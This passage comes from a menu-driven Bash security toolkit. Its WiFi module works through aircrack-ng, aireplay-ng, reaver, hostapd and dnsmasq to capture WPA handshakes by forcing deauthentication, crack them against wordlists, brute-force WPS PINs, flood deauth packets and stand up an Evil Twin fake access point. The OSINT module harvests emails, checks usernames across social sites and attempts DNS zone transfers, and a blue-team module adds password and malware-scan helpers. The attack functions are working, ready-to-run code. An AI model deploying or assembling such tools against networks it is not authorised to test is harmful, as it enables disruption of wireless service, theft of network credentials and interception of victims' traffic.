    # Check for wireless interfaces
    local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
    
    if [[ -z "$iface" ]]; then
        echo -e "${RED}[!] No wireless interface found${NC}"
        echo -n "Enter interface manually (e.g., wlan0): "
        read iface
    else
        echo -e "${GREEN}[+] Found wireless interface: $iface${NC}"
    fi
    
    [[ -z "$iface" ]] && return
    
    echo -n "Put interface in monitor mode? (y/n): "
    read enable_monitor
    
    if [[ "$enable_monitor" == "y" ]]; then
        airmon-ng check kill 2>/dev/null
        airmon-ng start "$iface" 2>/dev/null
        iface="${iface}mon"
        echo -e "${GREEN}[+] Monitor mode enabled on $iface${NC}"
    fi
    
    echo -e "${YELLOW}[*] Scanning for networks... Press Ctrl+C when ready${NC}"
    echo ""
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local scan_file="$RESULTS_DIR/wifi/scan_$timestamp.csv"
    
    airodump-ng "$iface" --write "$scan_file" --output-format csv 2>/dev/null &
    local scan_pid=$!
    
    echo -n "Press Enter to stop scan..."
    read
    
    kill $scan_pid 2>/dev/null
    echo -e "${GREEN}[+] Scan saved to: $scan_file${NC}"
    
    # Display results
    if [[ -f "$scan_file-01.csv" ]]; then
        echo -e "${CYAN}=== Networks Found ===${NC}"
        tail -n +2 "$scan_file-01.csv" | head -20
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# Capture WPA/WPA2 handshake
capture_handshake() {
    echo -e "${BLUE}[*] WPA/WPA2 Handshake Capture${NC}"
    
    local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
    [[ -z "$iface" ]] && { echo -n "Enter interface: "; read iface; }
    
    [[ -z "$iface" ]] && return
    
    echo -n "Enter target BSSID: "
    read target_bssid
    [[ -z "$target_bssid" ]] && return
    
    echo -n "Enter target channel: "
    read target_channel
    echo -n "Enter output filename (default: handshake): "
    read output_name
    output_name=${output_name:-handshake}
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local cap_dir="$RESULTS_DIR/wifi/handshakes"
    create_dir "$cap_dir"
    
    echo -e "${YELLOW}[*] Starting capture on channel $target_channel...${NC}"
    echo -e "${YELLOW}[*] Waiting for handshake. Send deauth to force reconnect.${NC}"
    
    airodump-ng --bssid "$target_bssid" -c "$target_channel" -w "$cap_dir/${output_name}_$timestamp" "$iface" 2>/dev/null &
    local capture_pid=$!
    
    echo ""
    echo -n "Send deauth packets to force handshake? (y/n): "
    read send_deauth
    
    if [[ "$send_deauth" == "y" ]]; then
        echo -n "Number of deauth packets (default: 10): "
        read deauth_count
        deauth_count=${deauth_count:-10}
        
        aireplay-ng -0 "$deauth_count" -a "$target_bssid" "$iface" 2>/dev/null
    fi
    
    echo -n "Press Enter to stop capture..."
    read
    kill $capture_pid 2>/dev/null
    
    # Check for handshake
    if [[ -f "$cap_dir/${output_name}_$timestamp-01.cap" ]]; then
        echo -e "${GREEN}[+] Capture file saved${NC}"
        aircrack-ng "$cap_dir/${output_name}_$timestamp-01.cap" 2>/dev/null | grep -E "WPA|handshake"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# Crack captured handshake
crack_handshake() {
    echo -e "${BLUE}[*] WPA/WPA2 Handshake Cracker${NC}"
    
    echo -n "Enter path to .cap file: "
    read cap_file
    
    [[ -z "$cap_file" ]] && return
    
    if [[ ! -f "$cap_file" ]]; then
        echo -e "${RED}[!] File not found${NC}"
        return
    fi
    
    echo "Select wordlist:"
    echo "1) rockyou.txt"
    echo "2) SecLists common passwords"
    echo "3) Custom wordlist"
    echo "0) Back to main menu"
    echo -n "Choice: "
    read wordlist_choice
    
    [[ "$wordlist_choice" == "0" ]] && return
    
    case $wordlist_choice in
        1) wordlist="$WORDLISTS_DIR/rockyou.txt" ;;
        2) wordlist="$WORDLISTS_DIR/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt" ;;
        3) 
            echo -n "Enter wordlist path: "
            read wordlist
            ;;
    esac
    
    if [[ ! -f "$wordlist" ]]; then
        echo -e "${RED}[!] Wordlist not found${NC}"
        return
    fi
    
    echo -e "${YELLOW}[*] Starting crack with aircrack-ng...${NC}"
    aircrack-ng "$cap_file" -w "$wordlist"
    
    echo -n "Press Enter to continue..."
    read
}

# WiFi Brute Forcer - Automated WPA/WPA2 cracking
wifi_brute_forcer() {
    echo -e "${BLUE}[*] WiFi Brute Forcer${NC}"
    echo -e "${YELLOW}[*] Automated WPA/WPA2 password cracking${NC}"
    echo ""
    
    local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
    [[ -z "$iface" ]] && { echo -n "Enter wireless interface: "; read iface; }
    [[ -z "$iface" ]] && return
    
    echo -n "Enable monitor mode? (y/n): "
    read enable_mon
    if [[ "$enable_mon" == "y" ]]; then
        airmon-ng check kill 2>/dev/null
        airmon-ng start "$iface" 2>/dev/null
        iface="${iface}mon"
    fi
    
    echo -e "${YELLOW}[*] Scanning for targets... (10 seconds)${NC}"
    local scan_file="$RESULTS_DIR/wifi/brute_scan_$(date +%Y%m%d_%H%M%S)"
    timeout 10 airodump-ng "$iface" --write "$scan_file" --output-format csv 2>/dev/null || true
    
    echo ""
    echo -e "${CYAN}=== Available Targets ===${NC}"
    local targets=()
    local i=1
    while IFS=',' read -r mac _ _ channel _ _ _ _ _ _ ssid _; do
        [[ -n "$mac" && "$mac" != "BSSID" ]] && [[ "$mac" =~ ^[0-9a-fA-F:]{17}$ ]] && \
            targets+=("$mac|$channel|$ssid") && \
            echo "  $i) $ssid ($mac) - Ch: $channel" && \
            ((i++))
    done < <(tail -n +2 "$scan_file-01.csv" 2>/dev/null | head -20)
    
    [[ ${#targets[@]} -eq 0 ]] && echo -e "${RED}[!] No targets found${NC}" && return
    
    echo ""
    echo "0) Back to main menu"
    echo -n "Select target: "
    read target_choice
    
    [[ "$target_choice" == "0" ]] && return
    [[ $target_choice -gt ${#targets[@]} ]] && echo -e "${RED}Invalid selection${NC}" && return
    
    local selected="${targets[$((target_choice-1))]}"
    local target_bssid=$(echo "$selected" | cut -d'|' -f1)
    local target_channel=$(echo "$selected" | cut -d'|' -f2)
    local target_ssid=$(echo "$selected" | cut -d'|' -f3)
    
    echo ""
    echo "Select wordlist:"
    echo "1) rockyou.txt ($(wc -l < "$WORDLISTS_DIR/rockyou.txt" 2>/dev/null || echo "unknown") words)"
    echo "2) SecLists top 100k"
    echo "3) Custom wordlist"
    echo "0) Back to main menu"
    echo -n "Choice: "
    read wordlist_choice
    
    [[ "$wordlist_choice" == "0" ]] && return
    
    case $wordlist_choice in
        1) wordlist="$WORDLISTS_DIR/rockyou.txt" ;;
        2) wordlist="$WORDLISTS_DIR/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt" ;;
        3) 
            echo -n "Enter wordlist path: "
            read wordlist
            ;;
    esac
    
    [[ ! -f "$wordlist" ]] && echo -e "${RED}[!] Wordlist not found${NC}" && return
    
    echo ""
    echo -e "${YELLOW}[*] Configuration:${NC}"
    echo "  Target: $target_ssid ($target_bssid)"
    echo "  Channel: $target_channel"
    echo "  Wordlist: $wordlist ($(wc -l < "$wordlist") words)"
    echo ""
    echo -n "Start brute force attack? (y/n): "
    read confirm
    
    [[ "$confirm" != "y" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local cap_file="$RESULTS_DIR/wifi/brute_${target_ssid}_$timestamp"
    
    echo -e "${YELLOW}[*] Capturing handshake...${NC}"
    airodump-ng --bssid "$target_bssid" -c "$target_channel" -w "$cap_file" "$iface" &
    local dump_pid=$!
    
    sleep 5
    echo -e "${YELLOW}[*] Sending deauth to force handshake...${NC}"
    aireplay-ng -0 10 -a "$target_bssid" "$iface" 2>/dev/null
    
    sleep 5
    kill $dump_pid 2>/dev/null
    
    local cap_file_path="${cap_file}-01.cap"
    if [[ -f "$cap_file_path" ]]; then
        echo -e "${GREEN}[+] Handshake captured${NC}"
        echo -e "${YELLOW}[*] Starting brute force...${NC}"
        aircrack-ng "$cap_file_path" -w "$wordlist"
    else
        echo -e "${RED}[!] Failed to capture handshake${NC}"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# WPS PIN attack
wps_attack() {
    check_install reaver
    echo -e "${BLUE}[*] WPS PIN Attack (Reaver)${NC}"
    
    local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
    [[ -z "$iface" ]] && { echo -n "Enter interface: "; read iface; }
    [[ -z "$iface" ]] && return
    
    echo -n "Enter target BSSID: "
    read target_bssid
    [[ -z "$target_bssid" ]] && return
    
    echo -e "${YELLOW}[*] Starting WPS PIN attack...${NC}"
    echo -e "${YELLOW}[*] This may take several hours${NC}"
    
    reaver -i "$iface" -b "$target_bssid" -vv
    
    echo -n "Press Enter to continue..."
    read
}

# Deauthentication attack
deauth_attack() {
    echo -e "${BLUE}[*] Deauthentication Attack${NC}"
    
    local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
    [[ -z "$iface" ]] && { echo -n "Enter interface: "; read iface; }
    [[ -z "$iface" ]] && return
    
    echo -n "Enter target BSSID (AP): "
    read target_bssid
    [[ -z "$target_bssid" ]] && return
    
    echo -n "Enter target client MAC (or FF:FF:FF:FF:FF:FF for broadcast): "
    read client_mac
    client_mac=${client_mac:-FF:FF:FF:FF:FF:FF}
    echo -n "Number of packets (0=infinite): "
    read packet_count
    
    echo -e "${RED}[!] WARNING: Only use on networks you own!${NC}"
    echo -n "Continue? (y/n): "
    read confirm
    
    if [[ "$confirm" == "y" ]]; then
        echo -e "${YELLOW}[*] Sending deauth packets...${NC}"
        aireplay-ng -0 "$packet_count" -a "$target_bssid" -c "$client_mac" "$iface"
    fi
    
    echo -n "Press Enter to continue..."
    read
}

# Evil Twin fake AP
evil_twin() {
    check_install hostapd
    check_install dnsmasq
    
    echo -e "${BLUE}[*] Evil Twin Access Point${NC}"
    echo -n "Enter interface for AP (e.g., wlan0): "
    read ap_iface
    [[ -z "$ap_iface" ]] && return
    
    echo -n "Enter SSID name: "
    read ssid_name
    echo -n "Enter channel (1-14): "
    read channel
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local evil_dir="$RESULTS_DIR/wifi/eviltwin_$timestamp"
    create_dir "$evil_dir"
    
    # Create hostapd config
    cat > "$evil_dir/hostapd.conf" << EOF
interface=$ap_iface
driver=nl80211
ssid=$ssid_name
hw_mode=g
channel=$channel
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF

    # Create dnsmasq config
    cat > "$evil_dir/dnsmasq.conf" << EOF
interface=$ap_iface
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
EOF

    echo -e "${YELLOW}[*] Setting up interface...${NC}"
    ifconfig "$ap_iface" up 10.0.0.1 netmask 255.255.255.0
    
    echo -e "${YELLOW}[*] Starting dnsmasq...${NC}"
    dnsmasq -C "$evil_dir/dnsmasq.conf" -d &
    local dns_pid=$!
    
    echo -e "${YELLOW}[*] Starting hostapd...${NC}"
    hostapd "$evil_dir/hostapd.conf" &
    local hostapd_pid=$!
    
    echo -e "${GREEN}[+] Evil Twin AP '$ssid_name' running on channel $channel${NC}"
    echo -e "${CYAN}Interface: $ap_iface | Gateway: 10.0.0.1${NC}"
    echo ""
    echo -n "Press Enter to stop AP..."
    read
    
    kill $hostapd_pid 2>/dev/null
    kill $dns_pid 2>/dev/null
    killall dnsmasq hostapd 2>/dev/null
    
    echo -e "${GREEN}[+] Evil Twin stopped${NC}"
    echo -n "Press Enter to continue..."
    read
}

# Monitor mode management
monitor_mode_menu() {
    echo -e "${BLUE}[*] Monitor Mode Management${NC}"
    
    local iface=$(iw dev 2>/dev/null | grep Interface | awk '{print $2}' | head -1)
    
    echo "Current interfaces:"
    iw dev 2>/dev/null | grep Interface | awk '{print "  - " $2}'
    echo ""
    
    echo "1) Enable monitor mode"
    echo "2) Disable monitor mode"
    echo "3) Change MAC address"
    echo "0) Back to main menu"
    echo -n "Choice: "
    read mon_choice
    
    case $mon_choice in
        1)
            echo -n "Enter interface: "
            read iface
            [[ -z "$iface" ]] && return
            echo -e "${YELLOW}[*] Enabling monitor mode on $iface...${NC}"
            airmon-ng check kill 2>/dev/null
            airmon-ng start "$iface"
            ;;
        2)
            echo -n "Enter interface (e.g., wlan0mon): "
            read iface
            [[ -z "$iface" ]] && return
            echo -e "${YELLOW}[*] Disabling monitor mode...${NC}"
            airmon-ng stop "$iface"
            service NetworkManager restart 2>/dev/null || service networking restart 2>/dev/null
            ;;
        3)
            echo -n "Enter interface: "
            read iface
            [[ -z "$iface" ]] && return
            echo -n "Enter new MAC (or 'random'): "
            read new_mac
            
            if [[ "$new_mac" == "random" ]]; then
                macchanger -r "$iface"
            else
                macchanger -m "$new_mac" "$iface"
            fi
            ;;
    esac
    
    echo -n "Press Enter to continue..."
    read
}

# =============================================================================
# OSINT MODULE
# =============================================================================

osint_menu() {
    while true; do
        echo -e "${CYAN}"
        cat << "EOF"
    ╔═══════════════════════════════════════════════════════════╗
    ║              OSINT & RECONNAISSANCE                       ║
    ╚═══════════════════════════════════════════════════════════╝
EOF
        echo -e "${NC}"
        
        echo "1) Domain Information Gathering"
        echo "2) Email OSINT (theHarvester)"
        echo "3) Social Media Reconnaissance"
        echo "4) Metadata Extraction"
        echo "5) Shodan Search"
        echo "6) DNS Enumeration"
        echo "7) WHOIS Lookup"
        echo "8) Full OSINT Report (All Tools)"
        echo "0) Back to Main Menu"
        echo ""
        echo -n "Select option: "
        read osint_choice
        
        case $osint_choice in
            1) domain_osint ;;
            2) email_osint ;;
            3) social_media_recon ;;
            4) metadata_extraction ;;
            5) shodan_search ;;
            6) dns_enum_osint ;;
            7) whois_lookup ;;
            8) full_osint_report ;;
            0) break ;;
            *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
        esac
    done
}

domain_osint() {
    echo -e "${BLUE}[*] Domain Information Gathering${NC}"
    echo -n "Enter domain: "
    read domain
    
    [[ -z "$domain" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local output_dir="$OSINT_DIR/domain_$domain_$timestamp"
    create_dir "$output_dir"
    
    echo -e "${YELLOW}[*] Gathering domain information...${NC}"
    
    # DNS records
    echo "=== DNS Records ===" > "$output_dir/dns_records.txt"
    for record in A AAAA MX NS TXT SOA; do
        echo "--- $record Records ---" >> "$output_dir/dns_records.txt"
        host -t "$record" "$domain" >> "$output_dir/dns_records.txt" 2>&1 || true
    done
    
    # Subdomain enumeration
    echo -e "${YELLOW}[*] Enumerating subdomains...${NC}"
    echo "=== Subdomains ===" > "$output_dir/subdomains.txt"
    for sub in www mail ftp admin portal api dev test staging shop blog vpn remote; do
        host "$sub.$domain" >> "$output_dir/subdomains.txt" 2>&1 &
    done
    wait
    
    # Certificate transparency
    curl -s "https://crt.sh/?q=%.$domain&output=json" 2>/dev/null | \
        jq -r '.[].name_value' 2>/dev/null | sort -u >> "$output_dir/subdomains.txt" || true
    
    # IP lookup
    local ip=$(host "$domain" | grep "has address" | head -1 | awk '{print $4}')
    echo "=== IP Information ===" > "$output_dir/ip_info.txt"
    echo "Domain: $domain" >> "$output_dir/ip_info.txt"
    echo "IP: $ip" >> "$output_dir/ip_info.txt"
    [[ -n "$ip" ]] && whois "$ip" >> "$output_dir/ip_info.txt" 2>&1 || true
    
    echo -e "${GREEN}[+] Domain OSINT complete. Results saved to: $output_dir${NC}"
    echo -n "Press Enter to continue..."
    read
}

email_osint() {
    check_install theharvester
    echo -e "${BLUE}[*] Email OSINT (theHarvester)${NC}"
    echo -n "Enter domain to search: "
    read domain
    
    [[ -z "$domain" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local output_file="$OSINT_DIR/emails_${domain}_$timestamp.txt"
    
    echo -e "${YELLOW}[*] Searching for emails...${NC}"
    theharvester -d "$domain" -b all -f "$output_file" 2>&1 | tail -50
    
    echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
    echo -n "Press Enter to continue..."
    read
}

social_media_recon() {
    echo -e "${BLUE}[*] Social Media Reconnaissance${NC}"
    echo -n "Enter username to search: "
    read username
    
    [[ -z "$username" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local output_file="$OSINT_DIR/social_${username}_$timestamp.txt"
    
    echo -e "${YELLOW}[*] Searching for username: $username${NC}"
    
    # Check various platforms
    echo "=== Social Media Recon for: $username ===" > "$output_file"
    echo "Generated: $(date)" >> "$output_file"
    echo "" >> "$output_file"
    
    local platforms=(
        "https://twitter.com/$username"
        "https://instagram.com/$username"
        "https://facebook.com/$username"
        "https://linkedin.com/in/$username"
        "https://github.com/$username"
        "https://reddit.com/user/$username"
        "https://tiktok.com/@$username"
        "https://youtube.com/user/$username"
    )
    
    for url in "${platforms[@]}"; do
        echo "Checking: $url" >> "$output_file"
        local status=$(curl -s -o /dev/null -w "%{http_code}" "$url" 2>/dev/null)
        if [[ "$status" == "200" ]]; then
            echo "[+] Found: $url" | tee -a "$output_file"
        else
            echo "[-] Status: $status" >> "$output_file"
        fi
        sleep 1
    done
    
    echo -e "${GREEN}[+] Social media recon complete. Results saved to: $output_file${NC}"
    echo -n "Press Enter to continue..."
    read
}

metadata_extraction() {
    check_install exiftool
    echo -e "${BLUE}[*] Metadata Extraction${NC}"
    echo -n "Enter file or directory path: "
    read filepath
    
    [[ -z "$filepath" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local output_file="$OSINT_DIR/metadata_$timestamp.txt"
    
    if [[ -f "$filepath" ]]; then
        exiftool "$filepath" | tee "$output_file"
    elif [[ -d "$filepath" ]]; then
        find "$filepath" -type f -exec exiftool {} \; | tee "$output_file"
    else
        echo -e "${RED}[!] Path not found${NC}"
        return
    fi
    
    echo -e "${GREEN}[+] Metadata saved to: $output_file${NC}"
    echo -n "Press Enter to continue..."
    read
}

shodan_search() {
    echo -e "${BLUE}[*] Shodan Search${NC}"
    
    if ! python3 -c "import shodan" 2>/dev/null; then
        echo -e "${YELLOW}[!] Shodan module not installed. Installing...${NC}"
        pip3 install shodan 2>/dev/null || pip3 install --break-system-packages shodan 2>/dev/null
    fi
    
    echo -n "Enter Shodan API key: "
    read -s shodan_key
    echo ""
    echo -n "Enter search query: "
    read query
    
    [[ -z "$query" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local output_file="$OSINT_DIR/shodan_$timestamp.txt"
    
    echo -e "${YELLOW}[*] Searching Shodan...${NC}"
    python3 << EOF | tee "$output_file"
import shodan
try:
    api = shodan.Shodan('$shodan_key')
    results = api.search('$query')
    print(f"Total results: {results['total']}")
    for result in results['matches'][:10]:
        print(f"IP: {result['ip_str']}")
        print(f"Port: {result['port']}")
        print(f"Org: {result.get('org', 'n/a')}")
        print(f"Data: {result['data'][:200]}...")
        print("-" * 40)
except Exception as e:
    print(f"Error: {e}")
EOF

    echo -e "${GREEN}[+] Shodan results saved to: $output_file${NC}"
    echo -n "Press Enter to continue..."
    read
}

dns_enum_osint() {
    echo -e "${BLUE}[*] DNS Enumeration${NC}"
    echo -n "Enter domain: "
    read domain
    
    [[ -z "$domain" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local output_file="$OSINT_DIR/dns_${domain}_$timestamp.txt"
    
    echo "=== DNS Enumeration for $domain ===" | tee "$output_file"
    echo "" | tee -a "$output_file"
    
    # NS lookup
    echo "--- Name Servers ---" | tee -a "$output_file"
    host -t ns "$domain" | tee -a "$output_file"
    
    # MX lookup
    echo "" | tee -a "$output_file"
    echo "--- Mail Servers ---" | tee -a "$output_file"
    host -t mx "$domain" | tee -a "$output_file"
    
    # Zone transfer attempt
    echo "" | tee -a "$output_file"
    echo "--- Zone Transfer Attempt ---" | tee -a "$output_file"
    for ns in $(host -t ns "$domain" | awk '{print $4}'); do
        echo "Trying $ns:" | tee -a "$output_file"
        host -l "$domain" "$ns" 2>&1 | tee -a "$output_file" || true
    done
    
    echo -e "${GREEN}[+] DNS enumeration saved to: $output_file${NC}"
    echo -n "Press Enter to continue..."
    read
}

whois_lookup() {
    echo -e "${BLUE}[*] WHOIS Lookup${NC}"
    echo -n "Enter domain or IP: "
    read target
    
    [[ -z "$target" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local output_file="$OSINT_DIR/whois_${target}_$timestamp.txt"
    
    whois "$target" | tee "$output_file"
    
    echo -e "${GREEN}[+] WHOIS saved to: $output_file${NC}"
    echo -n "Press Enter to continue..."
    read
}

full_osint_report() {
    echo -e "${BLUE}[*] Full OSINT Report${NC}"
    echo -n "Enter target domain: "
    read domain
    
    [[ -z "$domain" ]] && return
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local report_dir="$OSINT_DIR/full_report_${domain}_$timestamp"
    create_dir "$report_dir"
    
    echo -e "${YELLOW}[*] Running comprehensive OSINT... This may take a few minutes.${NC}"
    
    # Domain info
    echo "[1/6] Gathering domain information..."
    host "$domain" > "$report_dir/dns_basic.txt" 2>&1
    host -t mx "$domain" >> "$report_dir/dns_basic.txt" 2>&1
    host -t ns "$domain" >> "$report_dir/dns_basic.txt" 2>&1
    whois "$domain" > "$report_dir/whois.txt" 2>&1
    
    # Subdomains
    echo "[2/6] Enumerating subdomains..."
    for sub in www mail ftp admin portal api dev test staging shop blog vpn remote mobile; do
        host "$sub.$domain" >> "$report_dir/subdomains.txt" 2>&1 &
    done
    wait
    
    # Certificate transparency
    curl -s "https://crt.sh/?q=%.$domain&output=json" 2>/dev/null | \
        jq -r '.[].name_value' 2>/dev/null | sort -u > "$report_dir/cert_transparency.txt" || true
    
    # Email harvesting
    echo "[3/6] Searching for emails..."
    if command -v theharvester &>/dev/null; then
        theharvester -d "$domain" -b google,linkedin,yahoo 2>/dev/null | tail -100 > "$report_dir/emails.txt" || true
    fi
    
    # Web technologies
    echo "[4/6] Identifying web technologies..."
    curl -s -I "http://$domain" > "$report_dir/web_headers.txt" 2>&1 || true
    
    # IP info
    echo "[5/6] Gathering IP information..."
    local ip=$(host "$domain" | grep "has address" | head -1 | awk '{print $4}')
    [[ -n "$ip" ]] && whois "$ip" > "$report_dir/ip_whois.txt" 2>&1 || true
    
    # Generate summary report
    echo "[6/6] Generating summary..."
    cat > "$report_dir/SUMMARY.txt" << EOF
OSINT Report for: $domain
Generated: $(date)
Report ID: $timestamp

=== Files in this report ===
- dns_basic.txt: DNS A, MX, NS records
- whois.txt: WHOIS information for domain
- subdomains.txt: Discovered subdomains
- cert_transparency.txt: Certificate transparency logs
- emails.txt: Harvested email addresses
- web_headers.txt: HTTP headers
- ip_whois.txt: WHOIS for IP address

=== Quick Stats ===
EOF

    local subdomain_count=$(grep -c "has address" "$report_dir/subdomains.txt" 2>/dev/null || echo "0")
    local email_count=$(grep -c "@" "$report_dir/emails.txt" 2>/dev/null || echo "0")
    
    echo "Subdomains found: $subdomain_count" >> "$report_dir/SUMMARY.txt"
    echo "Emails found: $email_count" >> "$report_dir/SUMMARY.txt"
    echo "IP Address: $ip" >> "$report_dir/SUMMARY.txt"
    
    echo -e "${GREEN}[+] Full OSINT report complete: $report_dir${NC}"
    cat "$report_dir/SUMMARY.txt"
    
    echo -n "Press Enter to continue..."
    read
}

# =============================================================================
# BLUETEAM MODULE
# =============================================================================

blueteam_menu() {
    while true; do
        echo -e "${CYAN}"
        cat << "EOF"
    ╔═══════════════════════════════════════════════════════════╗
    ║              BLUE TEAM & DEFENSE                          ║
    ╚═══════════════════════════════════════════════════════════╝
EOF
        echo -e "${NC}"
        
        echo "1) Secure Password Generator"
        echo "2) Virus Scan (ClamAV)"
        echo "3) Rootkit Detection (rkhunter/chkrootkit)"
        echo "4) File Integrity Check"
        echo "5) Network Connection Monitor"
        echo "6) System Hardening Check"
        echo "0) Back to Main Menu"
        echo ""
        echo -n "Select option: "
        read bt_choice
        
        case $bt_choice in
            1) secure_password_gen ;;
            2) virus_scan ;;
            3) rootkit_detection ;;
            4) file_integrity_check ;;
            5) network_monitor ;;
            6) hardening_check ;;
            0) break ;;
            *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
        esac
    done
}

secure_password_gen() {
    echo -e "${BLUE}[*] Secure Password Generator${NC}"
    
    echo "1) Generate single password"
    echo "2) Generate multiple passwords"
    echo "3) Generate passphrase (diceware style)"
    echo "4) Check password strength"
    echo "0) Back to main menu"
    echo -n "Choice: "
    read choice
    
    [[ "$choice" == "0" ]] && return
    
    case $choice in
        1)
            echo -n "Enter password length (default 16): "
            read length
            length=${length:-16}
            
            # Generate secure password
            local password=$(openssl rand -base64 48 | tr -dc 'a-zA-Z0-9!@#$%^&*' | head -c "$length")
            echo -e "${GREEN}[+] Generated Password: $password${NC}"
            
            echo -n "Save to file? (y/n): "
            read save
            [[ "$save" == "y" ]] && echo "$password" >> "$RESULTS_DIR/blueteam/generated_passwords.txt" && \
                echo -e "${GREEN}[+] Saved to generated_passwords.txt${NC}"
            ;;
        2)
            echo -n "How many passwords? "
            read count
            echo -n "Password length? "
            read length
            length=${length:-16}
            
            timestamp=$(date +%Y%m%d_%H%M%S)
            local output_file="$RESULTS_DIR/blueteam/passwords_$timestamp.txt"
            
            echo "Generated Passwords ($(date))" > "$output_file"
            echo "============================" >> "$output_file"
            
            for i in $(seq 1 "$count"); do
                local pwd=$(openssl rand -base64 48 | tr -dc 'a-zA-Z0-9!@#$%^&*' | head -c "$length")
                echo "$i) $pwd" | tee -a "$output_file"
            done
            
            echo -e "${GREEN}[+] Passwords saved to: $output_file${NC}"
            ;;
        3)
            echo -n "Number of words in passphrase (default 6): "
            read words
            words=${words:-6}
            
            if [[ -f "$WORDLISTS_DIR/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt" ]]; then
                local passphrase=$(shuf -n "$words" "$WORDLISTS_DIR/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt" | tr '\n' '-' | sed 's/-$//')
                echo -e "${GREEN}[+] Generated Passphrase: $passphrase${NC}"
            else
                # Fallback to random words
                local passphrase=$(cat /usr/share/dict/words 2>/dev/null | shuf -n "$words" | tr '\n' '-' | sed 's/-$//' || \
                    openssl rand -base64 32 | tr -dc 'a-z' | fold -w 5 | head -$words | tr '\n' '-' | sed 's/-$//')
                echo -e "${GREEN}[+] Generated Passphrase: $passphrase${NC}"
            fi
            ;;
        4)
            echo -n "Enter password to check: "
            read -s password
            echo ""
            
            local length=${#password}
            local score=0
            
            [[ $length -ge 12 ]] && ((score+=2))
            [[ $length -ge 16 ]] && ((score+=2))
            [[ "$password" =~ [A-Z] ]] && ((score+=1))
            [[ "$password" =~ [a-z] ]] && ((score+=1))
            [[ "$password" =~ [0-9] ]] && ((score+=1))
            [[ "$password" =~ [\!\@\#\$\%\^\&\*] ]] && ((score+=2))

            echo "Length: $length"
            echo "Score: $score/9"
            
            if [[ $score -ge 7 ]]; then
                echo -e "${GREEN}[+] Strong password${NC}"
            elif [[ $score -ge 4 ]]; then
                echo -e "${YELLOW}[~] Moderate password${NC}"
            else
                echo -e "${RED}[!] Weak password${NC}"
            fi
            ;;
    esac
    
    echo -n "Press Enter to continue..."
    read
}

virus_scan() {
    check_install clamav clamscan
    
    echo -e "${BLUE}[*] Virus Scanner (ClamAV)${NC}"
    
    # Update virus database
    echo -e "${YELLOW}[*] Updating virus database...${NC}"
    freshclam 2>/dev/null || echo -e "${YELLOW}[!] Could not update database (may need to run freshclam manually)${NC}"
    
    echo -n "Enter path to scan (file or directory): "
    read scan_path
    
    [[ -z "$scan_path" ]] && return
    
    if [[ ! -e "$scan_path" ]]; then
        echo -e "${RED}[!] Path not found${NC}"
        return
    fi
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local log_file="$RESULTS_DIR/blueteam/virus_scan_$timestamp.log"
    
    echo -e "${YELLOW}[*] Scanning...${NC}"
    
    if [[ -d "$scan_path" ]]; then
        clamscan -r --infected --log="$log_file" "$scan_path"
    else
        clamscan --infected --log="$log_file" "$scan_path"
    fi
    
    echo -e "${GREEN}[+] Scan complete. Log saved to: $log_file${NC}"
    
    # Show summary
    grep "Infected files:" "$log_file" 2>/dev/null || echo "Scan finished."
    
    echo -n "Press Enter to continue..."
    read
}

rootkit_detection() {
    echo -e "${BLUE}[*] Rootkit Detection${NC}"
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    local output_dir="$RESULTS_DIR/blueteam/rootkit_scan_$timestamp"
    create_dir "$output_dir"
    
    echo "1) Run rkhunter"
    echo "2) Run chkrootkit"
    echo "3) Run both"
    echo "0) Back to main menu"
    echo -n "Choice: "
    read choice
    
    [[ "$choice" == "0" ]] && return
    
    if [[ "$choice" == "1" || "$choice" == "3" ]]; then
        if command -v rkhunter &>/dev/null; then
            echo -e "${YELLOW}[*] Running rkhunter...${NC}"
            rkhunter --check --sk --logfile "$output_dir/rkhunter.log" 2>&1 | tail -100
        else
            echo -e "${RED}[!] rkhunter not installed${NC}"
        fi
    fi
    
    if [[ "$choice" == "2" || "$choice" == "3" ]]; then
        if command -v chkrootkit &>/dev/null; then
            echo -e "${YELLOW}[*] Running chkrootkit...${NC}"
            chkrootkit 2>&1 | tee "$output_dir/chkrootkit.log" | tail -50
        else
            echo -e "${RED}[!] chkrootkit not installed${NC}"
        fi
    fi
    
    echo -e "${GREEN}[+] Rootkit scan complete. Results in: $output_dir${NC}"
    echo -n "Press Enter to continue..."
    read
}

file_integrity_check() {
    echo -e "${BLUE}[*] File Integrity Check${NC}"
    
    echo -n "Enter directory to monitor: "
    read dir_path
    
    [[ -z "$dir_path" ]] && return
    [[ ! -d "$dir_path" ]] && echo -e "${RED}[!] Directory not found${NC}" && return
    
